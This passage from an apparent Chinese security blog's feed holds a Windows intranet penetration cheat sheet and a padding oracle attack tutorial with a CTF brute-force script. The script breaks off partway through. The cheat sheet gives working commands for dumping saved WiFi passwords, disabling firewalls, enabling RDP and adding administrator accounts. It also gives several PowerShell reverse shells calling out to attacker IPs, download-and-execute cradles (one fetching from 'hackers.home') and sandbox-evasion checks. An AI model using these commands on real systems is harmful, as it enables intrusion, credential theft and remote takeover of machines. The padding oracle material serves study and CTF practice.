    
    
      
      
    <summary type="html">&lt;p&gt;前面的话:”免杀一般都是靠组合拳”&lt;/p&gt;
&lt;h1 id=&quot;EXE&quot;&gt;&lt;a href=&quot;#EXE&quot; class=&quot;headerlink&quot; title=&quot;EXE&quot;&gt;&lt;/a&gt;EXE&lt;/h1&gt;&lt;h3 id=&quot;加壳&quot;&gt;&lt;a href=&quot;#加壳&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    
    <category term="系统相关与免杀" scheme="http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透常用命令总汇</title>
    <link href="http://const27.com/2021/09/03/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/"/>
    <id>http://const27.com/2021/09/03/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/</id>
    <published>2021-09-03T13:07:23.349Z</published>
    <updated>2021-09-03T13:18:16.804Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>前几天面试的时候被师傅问到了这个问题，当时不是很会，现在来学学</p><h3 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h3><p>ipconfig /all</p><h3 id="查询本机的服务信息"><a href="#查询本机的服务信息" class="headerlink" title="查询本机的服务信息"></a>查询本机的服务信息</h3><p>wmic service list brief</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010533168.png" alt="image-20210217010533168"></p><h3 id="查询系统信息"><a href="#查询系统信息" class="headerlink" title="查询系统信息"></a>查询系统信息</h3><p>systeminfo</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010547050.png" alt="image-20210217010547050"></p><h3 id="连接过的WIFI及密码"><a href="#连接过的WIFI及密码" class="headerlink" title="连接过的WIFI及密码"></a>连接过的WIFI及密码</h3><ol><li>for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan show profiles’) do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</li></ol><h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><p>tasklist / wmic process list brief</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010556587.png" alt="image-20210217010556587"></p><h3 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h3><p>schtasks /query /fo LIST /v 列出计划任务详细信息</p><h3 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h3><p>net statistics workstation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010605609.png" alt="image-20210217010605609"></p><h3 id="用户相关"><a href="#用户相关" class="headerlink" title="用户相关"></a>用户相关</h3><p>net user 查看所有用户<br>net localgroup administrators 获取本地管理员信息</p><h3 id="查看端口列表"><a href="#查看端口列表" class="headerlink" title="查看端口列表"></a>查看端口列表</h3><p>netstat -ano</p><h3 id="查看已打补丁"><a href="#查看已打补丁" class="headerlink" title="查看已打补丁"></a>查看已打补丁</h3><p>wmic qfe get Caption,Description,HotFixID,InstalledOn</p><h3 id="查看共享列表"><a href="#查看共享列表" class="headerlink" title="查看共享列表"></a>查看共享列表</h3><p>net share 查看本机共享列表和可访问的域共享列表<br>wmic share get name,path,status 查找共享列表</p><p><img src="http://www.const27.com/wp-content/uploads/2020/08/image-7.png" alt="img"></p><h3 id="路由表和arp高速缓存表"><a href="#路由表和arp高速缓存表" class="headerlink" title="路由表和arp高速缓存表"></a>路由表和arp高速缓存表</h3><p>route print 路由表<br>arp -a arp高速缓存表</p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>netsh firewall set opmode disable 关闭防火墙(Windows Server 2003 以前的版本)</p><p>netsh advfirewall set allprofiles state off 关闭防火墙(Windows Server 2003 以后的版本)</p><p>netsh firewall show config 查看防火墙配置<br>如果上面的命令被弃用，则使用<br>netsh advfirewall firewall show rule name=all</p><p>根据参考，可以使用这个wmic一键获取本机信息<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><h3 id="权限查看"><a href="#权限查看" class="headerlink" title="权限查看"></a>权限查看</h3><p>whoami /all 查看自己的详细权限<br>net user xxx /domain 查看域内指定用户的权限</p><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>.net time /domain 若出现以下情况则不存在域</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010613612.png" alt="image-20210217010613612"></p><p>若是报错：发生系统错误5，则存在域，但该用户不是域用户</p><p>若是以下情况则说明存在域且已经在域中</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010619330.png" alt="image-20210217010619330"></p><h3 id="查看域的名字"><a href="#查看域的名字" class="headerlink" title="查看域的名字"></a>查看域的名字</h3><p>net config workstation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010626107.png" alt="image-20210217010626107"></p><p>nslookup -type=srv _ldap._tcp</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010633461.png" alt="image-20210217010633461"></p><p>这个很爽，域控主机名和IP一块弄出来了</p><h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><p>1.使用工具 nbtscan <a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p><p>2.查看arp高速缓存表</p><p>arp -a</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/0X@7L2W0IVA%60NKX1AM9JZKB.png" alt="img"></p><p>3.ICMP协议探测（逐个ping）</p><p>这个贼慢，但是不用下载其他应用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure><p>4.nmap直接开扫</p><p>5.meterpreter会话中执行 run windows/gather/enum_ad_computers</p><h3 id="扫描域内开放端口"><a href="#扫描域内开放端口" class="headerlink" title="扫描域内开放端口"></a>扫描域内开放端口</h3><p>1.nmap</p><p>nmap 192.168.1.0/24</p><p>2.工具 S扫描器</p><p>3.自写脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python3 慢的一批</span><br><span class="line">import socket</span><br><span class="line"> </span><br><span class="line">def get_ip_status(ip,port):</span><br><span class="line">    server &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        server.connect((ip,port))</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port))</span><br><span class="line">    except Exception as err:</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip,port))</span><br><span class="line">    finally:</span><br><span class="line">        server.close()</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    host &#x3D; &#39;172.16.0.198&#39;</span><br><span class="line">    for port in range(20,100):</span><br><span class="line">        get_ip_status(host,port)</span><br></pre></td></tr></table></figure><h3 id="域内基本信息"><a href="#域内基本信息" class="headerlink" title="域内基本信息"></a>域内基本信息</h3><p>net group “domain computers” /domain 查询所有域成员计算机列表<br>net view /domain:HACHE 查询域内所有主机<br>net accounts /domain 获取域密码信息<br>nltest /domain_trusts 获取域信任信息<br>nltest /DCLIST:hacke 查看域控制器机器名<br>Nslookup -type=SRV_ldap._tcp 查看域控制器的主机名</p><h3 id="域用户信息收集"><a href="#域用户信息收集" class="headerlink" title="域用户信息收集"></a>域用户信息收集</h3><p>net user /domain 向域控制器查询域内用户列表<br>wmic useraccount get /all 获取域内用户详细信息<br>net localgroup administrators 查询本地管理员用户<br>net group “domain admins” /domain 查询域管理员用户<br>net group “Enterprise admins” /domain 查询管理员用户组</p><h3 id="本机wmic查杀软"><a href="#本机wmic查杀软" class="headerlink" title="本机wmic查杀软"></a>本机wmic查杀软</h3><p><code>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code><br>or</p><p>WMIC /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</p><h3 id="开3389"><a href="#开3389" class="headerlink" title="开3389"></a>开3389</h3><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><h3 id="用户增删改查"><a href="#用户增删改查" class="headerlink" title="用户增删改查"></a>用户增删改查</h3><p>net user username password /add 加用户</p><p>net localgroup administrators username /add 添加XX到管理员账户</p><h3 id="一些喜欢用的"><a href="#一些喜欢用的" class="headerlink" title="一些喜欢用的"></a>一些喜欢用的</h3><p>Windows 反弹shell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;); powercat -c 192.168.1.4 -p 9999 -e cmd</span><br><span class="line"></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666</span><br><span class="line"></span><br><span class="line">NISHANG里面抠的</span><br><span class="line">（乞丐版）</span><br><span class="line">$sm&#x3D;(New-Object Net.Sockets.TCPClient(&quot;192.168.254.1&quot;,55555)).GetStream();[byte[]]$bt&#x3D;0..65535|%&#123;0&#125;;while(($i&#x3D;$sm.Read($bt,0,$bt.Length)) -ne 0)&#123;;$d&#x3D;(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st&#x3D;([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)&#125; </span><br><span class="line">（豪华版）</span><br><span class="line">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&quot;192.168.254.1&quot;,4444);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2  &#x3D; $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br><span class="line"></span><br><span class="line">(cmd专版)</span><br><span class="line">rundll32.exe javascript:&quot;&quot;\..\mshtml,RunHTMLApplication &quot;&quot;;document.write();r&#x3D;new%20ActiveXObject(&quot;&quot;WScript.Shell&quot;&quot;).run(&quot;&quot;powershell -w h -ep bypass &#96;$sm&#x3D;(New-Object Net.Sockets.TCPClient(&#39;$IPAddress&#39;,$Port)).GetStream();[byte[]]&#96;$bt&#x3D;0..65535|%&#123;0&#125;;while((&#96;$i&#x3D;&#96;$sm.Read(&#96;$bt, 0, &#96;$bt.Length)) -ne 0)&#123;;&#96;$d&#x3D;(New-Object Text.ASCIIEncoding).GetString(&#96;$bt,0, &#96;$i);&#96;$sb&#x3D;(iex &#96;$d 2&gt;&amp;1 | Out-String );&#96;$sb2&#x3D;&#96;$sb + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;&#96;$sb&#x3D;([text.encoding]::UTF8).GetBytes(&#96;$sb2);&#96;$sm.Write(&#96;$sb,0,&#96;$sb.Length);&#96;$sm.Flush()&#125;&quot;&quot;,0,true);</span><br></pre></td></tr></table></figure><p>wmic 查杀软</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WMIC &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</span><br><span class="line"></span><br><span class="line">WMIC &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List</span><br></pre></td></tr></table></figure><p>开3389</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName &#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 0</span><br></pre></td></tr></table></figure><p>常见杀软进程名<br><a href="https://blog.csdn.net/weixin_39997829/article/details/92666552">https://blog.csdn.net/weixin_39997829/article/details/92666552</a></p><p>cmd下载</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;www.xx.com&#x2F;code.jpg c:\users\sdyp\desktop\ff.jpg</span><br><span class="line"></span><br><span class="line">C:\Temp&gt;certutil.exe -urlcache -split -f &quot;https:&#x2F;&#x2F;hackers.home&#x2F;badcontent.txt&quot; bad.txt</span><br><span class="line">C:\Temp&gt;certutil.exe -decode bad.txt bad.exe</span><br></pre></td></tr></table></figure><p>获取盘符</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic logicaldisk where drivetype&#x3D;3 get deviceid</span><br></pre></td></tr></table></figure><h3 id="ps-cs-上线"><a href="#ps-cs-上线" class="headerlink" title="ps cs 上线"></a>ps cs 上线</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -c IEX((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;a.ps1&#39;))</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials&#x3D;[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http:&#x2F;&#x2F;webserver&#x2F;payload.ps1&#39;)|iex&quot;</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1   (smb)</span><br></pre></td></tr></table></figure><h3 id="查看开机自启"><a href="#查看开机自启" class="headerlink" title="查看开机自启"></a>查看开机自启</h3><p>Reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p><p>Reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p><h3 id="获取遥测任务"><a href="#获取遥测任务" class="headerlink" title="获取遥测任务"></a>获取遥测任务</h3><p>Reg query <strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser</strong></p><h3 id="反病毒检测"><a href="#反病毒检测" class="headerlink" title="反病毒检测"></a>反病毒检测</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct</span><br></pre></td></tr></table></figure><p>根据系统的不同，反病毒软件通常会WMI中注册为<code>AntiVirusProduct</code>，保存在<code>root\SecurityCenter</code>或<code>root\SecurityCenter2</code>命名空间中。</p><h3 id="简单的沙盒-amp-虚拟机检测"><a href="#简单的沙盒-amp-虚拟机检测" class="headerlink" title="简单的沙盒&amp;虚拟机检测"></a>简单的沙盒&amp;虚拟机检测</h3><p>沙盒往往是单核且内存小于2g，可以以此为凭据检测</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Class Win32_ComputerSystem NumberOfLogicalProcessors,TotalPhysicalMemory</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210802132941979.png" alt="image-20210802132941979"></p><p>VMWARE虚拟机如今用的比较多，我们可以通过检测进程中是否存在vmtoolsd以及BIOS属性里是否有VMWARE字样来判断是否是VMWARE虚拟机</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject Win32_BIOS -Filter &#39;SerialNumber Like &quot;%VMware%&quot;&#39;</span><br><span class="line">Get-WmiObject Win32_NetworkAdapter -Filter &#39;Manufacturer LIKE &quot;%VMware%&quot; OR Name LIKE &quot;%VMware%&quot;&#39;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h1&gt;&lt;p&gt;前几天面试的时候被师傅问到了这个问题，当时不是很会，现在来学学&lt;/p&gt;
&lt;h3 id=&quot;查询网络配置信息&quot;&gt;&lt;a href=&quot;#查询网络配置</summary>
      
    
    
    
    
    <category term="内网渗透与权限维持" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>WEB中常见的几类密码学攻击方式</title>
    <link href="http://const27.com/2021/06/28/WEB%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%B1%BB%E5%AF%86%E7%A0%81%E5%AD%A6%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://const27.com/2021/06/28/WEB%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%B1%BB%E5%AF%86%E7%A0%81%E5%AD%A6%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2021-06-28T13:52:26.915Z</published>
    <updated>2021-06-28T13:42:56.111Z</updated>
    
    <content type="html"><![CDATA[<p>参考: <a href="https://www.freebuf.com/articles/database/151167.html">https://www.freebuf.com/articles/database/151167.html</a><br><a href="https://www.jianshu.com/p/7f171477a603">https://www.jianshu.com/p/7f171477a603</a></p><p>因为是涉及密码学的东西，所以看的我头大，记录一下吧。</p><h1 id="Padding-oracle-attack-与CBC翻转字节攻击"><a href="#Padding-oracle-attack-与CBC翻转字节攻击" class="headerlink" title="Padding oracle attack 与CBC翻转字节攻击"></a>Padding oracle attack 与CBC翻转字节攻击</h1><h2 id="异或（XOR）"><a href="#异或（XOR）" class="headerlink" title="异或（XOR）"></a>异或（XOR）</h2><p>何为异或?<br>异或是一种运算方法，简要概括就是同假异真</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">true xor true &#x3D; false; true xor false &#x3D; true;</span><br><span class="line"></span><br><span class="line">在二进制中:</span><br><span class="line">011 xor 110 &#x3D; 101; 二进制数每位数分别进行xor运算</span><br><span class="line">上面算式的运算步骤是这样的 0 xor 1 &#x3D; 1;1 xor 1 &#x3D; 0;1 xor 0&#x3D;1</span><br><span class="line">然后把运算结果写在一起就是101了</span><br><span class="line"></span><br><span class="line">在更高的进制中:</span><br><span class="line">以十进制为例: 65 xor 42 &#x3D; 107; 原理就是把十进制数字先变为二进制数进行异或，再将异或得到的二进制数结果变为十进制数</span><br><span class="line"></span><br><span class="line">在字符中:</span><br><span class="line">对字符进行异或运算其实就是对字符的ascii码进行异或计算，计算得到的结果视作新的一个ascii码再将其转换为字符。</span><br></pre></td></tr></table></figure><p>xor还有一个性质，就是<br>已知 a xor b = c 那么<br>b xor c =a; a xor c = b.即满足异或运算里只需知道任意两个数就能得到另一个数。</p><h2 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h2><p>CBC是一种加密模型，采用的是分组链接模式。把明文分为一组一组进行加密</p><p><img src="https://image.3001.net/images/20171018/15083333186437.png!small" alt="Padding oracle attack详细解析"></p><p>上图是CBC加密流程。最开始一个特别分组IV去和第一段密文XOR，得到的结果被密钥加密，加密得到该组的密文，同时这个密文会充当最开始的特别分组IV的作用去参与下一组的加密，以此类推。</p><p>CBC的每一个分组的加密结果都可以影响到下一个分组的加密结果， 使原本独立的分组密码加密过程形成迭代 ， 这可以强化加密算法的”敏感性”，即实现所谓的”雪崩效应”，在香浓理论中这就是”扰乱原则” 。</p><p>CBC只是一种模式，它经常把aes或des作为加密使用的算法。 DES分组长度是八字节而AES分组长度是十六字节 。</p><p>接下来是CBC解密</p><p><img src="https://image.3001.net/images/20171018/15083355296698.png!small" alt="Padding oracle attack详细解析"></p><p>顺序依旧是从左到右，第一组密文被KEY解密后与IV xor得到第一组明文，同时第一组密文参与下一组的解密充当IV作用。</p><h2 id="PKCS-5"><a href="#PKCS-5" class="headerlink" title="PKCS #5"></a><strong>PKCS #5</strong></h2><p>竟然CBC模式涉及到分组，那么就会出现最后一组字节没有被占满的情况。<br>比如原本一个分组是8字节，我们有15个字节的明文需要被加密，此时最后一个分组就不会被占满（还差一个字节占满），那么这个时候要怎么办呢？</p><p>这时候就需要对最后一个分组进行填充，将其填充满。<br>对于采用des算法加密的内容，填充规则是PKC #5,而AES是 PKC #7.<br>这两者唯一区别是 PKCS #5填充是八字节分组而PKCS #7是十六字节 ，还记得上面我们说过的 DES分组长度是八字节而AES分组长度是十六字节 吗？就是这个分组字节数影响了填充方式。</p><p>那么具体是怎么填充的呢，我们以PKC #5为例</p><p><img src="https://image.3001.net/images/20171018/15083384721064.png!small" alt="Padding oracle attack详细解析"></p><p>当最后一组还剩n个字节未被填充时，就会填充n个 0xn字符上去.<br>上图是PKCS #5,其实PKCS #7和PKCS #5原理是一样的，不过是分组字节数大了点罢了（0~16）</p><h2 id="Padding-oracle-attack"><a href="#Padding-oracle-attack" class="headerlink" title="Padding oracle attack"></a>Padding oracle attack</h2><p>上面只是铺垫，建议学懂了再来看这个攻击方式。不然会非常头大。</p><h3 id="Padding-oracle-attack-攻击场景举例"><a href="#Padding-oracle-attack-攻击场景举例" class="headerlink" title="Padding oracle attack 攻击场景举例"></a>Padding oracle attack 攻击场景举例</h3><p>首先我们假设一个场景，从而引出这个攻击。</p><p>假设我们有一个任意文件包含场景</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url?file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>黑客们看见了就会很轻而易举的去包含想要的文件。管理者发现了这个问题，对file参数采用了CBC加密，即当提交请求时，file参数的值是被加密的，然后服务器用算法解密得到其想包含的文件，然后返回给客户端。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url?file&#x3D;e28b2e3c972edab8 其中前8位数是IV，后八位数是密文。（这里是我瞎写的密文&#x3D; &#x3D;，你只需要理解到这里是一个CBC加密后的密文就行了）</span><br></pre></td></tr></table></figure><p>那么如何去实现我们的任意文件包含呢? padding oracle attack 出现了。</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>假设我们向刚刚那个任意文件包含的提交了一段密文。服务器就会尝试解密，就会出现三种结果。</p><p>1.密文不能正常解密，这种原因是在于最后一组的填充字节出现了错误<br>2.密文能正常解密但解密出来的文件路径不存在<br>3.密文能正常解密且能成功包含</p><p>其中第1种情况和2.3种情况网页返回的内容肯定是不同的。<br>比如说第一种情况可能就直接返回500了，2.3可能就是302跳转啥啥的，通过这个网页返回的信息，我们就有了可乘之机。</p><p>我们先通过一个图感受一下第一组的解密流程</p><p><img src="https://image.3001.net/images/20171019/15083434757270.png!small" alt="Padding oracle attack详细解析"></p><p>好的好的，感受了这个解密流程后，我们来说说攻击的事。<br>如果我们得到了 Intermediary Value(中间值)，并且可以手动修改IV，那么我们岂不是可以构造任意Decrypted Value（明文）了？<br>所以padding oracle attack 的核心就是去获得中间值。<br>那么我们怎么去获取呢？</p><p>还记得刚刚提到的3种情况吗？我们可以通过修改IV，通过判断网页返回内容来判断中间值，具体做法如下:</p><p>我们先把IV全部设置为0x00，然后修改IV的最后一个数，当其与中间值XOR后的值为0x01则此时解密就会成功，若不是0x01解密就会失败，网页会返回不同的内容，以此来判断何时解密成功。然后把解密成功时的IV的最后一位数与0x01进行异或计算，即可得到中间值的最后一位</p><p><img src="https://image.3001.net/images/20171019/15083441758558.png!small" alt="Padding oracle attack详细解析"></p><p>然后我们把IV最后一位数设置为能和中间值最后一位数异或后值为0x02的数，穷举IV倒数第二个数看看哪个数能和中间值倒数第二个数异或运算后值为0x02，然后我们就可得到中间值倒数第二个数，以此类推可以获得第一组的中间值（有点绕）<br>然后破解到了中间值我们再用最开始的IV（不是我们后面构造的IV）去和中间值异或就得到明文了<br>当然，你也可以再次构造IV，从而构造解密出来的字符（通过中间值与IV异或）</p><h2 id="NPUCTF2020-web🐕中的Padding-oracle-Attack"><a href="#NPUCTF2020-web🐕中的Padding-oracle-Attack" class="headerlink" title="[NPUCTF2020]web🐕中的Padding oracle Attack"></a>[NPUCTF2020]web🐕中的Padding oracle Attack</h2><p>我们以这道题为切入点，详细看看如何实现攻击。<br>本题就是以下代码，我们要想方设法先拿到$flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;config.php&#39;);   # $key,$flag</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);  &#x2F;&#x2F;定义加密方式</span><br><span class="line">define(&quot;SECRET_KEY&quot;, $key);    &#x2F;&#x2F;定义密钥</span><br><span class="line">define(&quot;IV&quot;,&quot;6666666666666666&quot;);    &#x2F;&#x2F;定义初始向量 16个6</span><br><span class="line">define(&quot;BR&quot;,&#39;&lt;br&gt;&#39;);</span><br><span class="line">if(!isset($_GET[&#39;source&#39;]))header(&#39;location:.&#x2F;index.php?source&#x3D;1&#39;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#var_dump($GLOBALS);   &#x2F;&#x2F;听说你想看这个？</span><br><span class="line">function aes_encrypt($iv,$data)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;--------encrypt---------&quot;.BR;</span><br><span class="line">    echo &#39;IV:&#39;.$iv.BR;</span><br><span class="line">    return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line">function aes_decrypt($iv,$data)</span><br><span class="line">&#123;</span><br><span class="line">    return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#39;False&#39;); &#x2F;&#x2F;只能返回1或false</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#39;method&#39;]&#x3D;&#x3D;&#39;encrypt&#39;)</span><br><span class="line">&#123;</span><br><span class="line">    $iv &#x3D; IV;</span><br><span class="line">    $data &#x3D; $flag;    </span><br><span class="line">    echo aes_encrypt($iv,$data);</span><br><span class="line">&#125; else if($_GET[&#39;method&#39;]&#x3D;&#x3D;&quot;decrypt&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    $iv &#x3D; @$_POST[&#39;iv&#39;];</span><br><span class="line">    $data &#x3D; @$_POST[&#39;data&#39;];</span><br><span class="line">    echo aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;我摊牌了，就是懒得写前端&quot;.BR;</span><br><span class="line"></span><br><span class="line">if($_GET[&#39;source&#39;]&#x3D;&#x3D;1)highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们先拿到密文 ly7auKVQCZWum/W/4osuPA==<br>然后对其进行base64解密，发现其刚好是有16个字节，那么我们可以直接穷举IV得到中间值，然后凭此与初始IV（16个6）进行异或得到明文$flag.</p><p>话不多说，爆破中间值的脚本安排上。(借鉴了一个大佬的WP）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">Intermediary&#x3D;&quot;&quot;</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;de1650aa-2b24-40e0-bb51-736ff5d38269.node3.buuoj.cn&#x2F;&#x2F;index.php?source&#x3D;1&amp;method&#x3D;decrypt&quot;</span><br><span class="line">iv&#x3D;&quot;&quot;</span><br><span class="line">hexs&#x3D;&quot;&quot;</span><br><span class="line">IV&#x3D;&quot;6666666666666666&quot;</span><br><span class="line">def xor(a,b):</span><br><span class="line">    return &quot;&quot;.join([chr(ord(a[i])^ord(b[i])) for i in range(len(a))])</span><br><span class="line"></span><br><span class="line">for step in range(1,17):</span><br><span class="line">    padding&#x3D;chr(step)*(step-1)</span><br><span class="line">    print(&quot;第%s轮&quot;%step)</span><br><span class="line">    for i in range(0,256):</span><br><span class="line">        iv&#x3D;chr(0)*(16-step)+chr(i)+xor(Intermediary,padding)</span><br><span class="line">        post&#x3D;&#123;</span><br><span class="line">            &quot;iv&quot;:iv,</span><br><span class="line">            &quot;data&quot;:&quot;ly7auKVQCZWum&#x2F;W&#x2F;4osuPA&#x3D;&#x3D;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        